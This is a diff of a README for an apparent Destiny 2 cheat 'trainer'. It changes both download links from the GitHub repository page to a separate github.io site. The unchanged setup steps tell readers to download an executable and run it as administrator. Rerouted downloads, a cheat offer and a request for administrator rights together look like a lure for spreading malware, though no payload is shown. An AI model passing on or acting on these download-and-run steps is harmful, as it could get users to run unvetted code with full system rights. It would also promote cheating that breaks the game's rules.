@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-max - Automate gameplay tasks for better performance
 
-[![Download Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Papau6625/Destiny2-Ultimate-Trainer-2026-max)
+[![Download Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://papau6625.github.io)
 
 ## 📋 About the Trainer
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications to run the software effectively:
 
 Follow these steps to set up the software correctly.
 
-1. Visit the repository page to download the latest executable file: https://github.com/Papau6625/Destiny2-Ultimate-Trainer-2026-max.
+1. Visit the repository page to download the latest executable file: https://papau6625.github.io
 2. Locate the folder where your browser saves files.
 3. Move the downloaded file to a dedicated folder on your desktop for easy access.
 4. Right-click the file and select "Run as administrator" to grant necessary permissions.
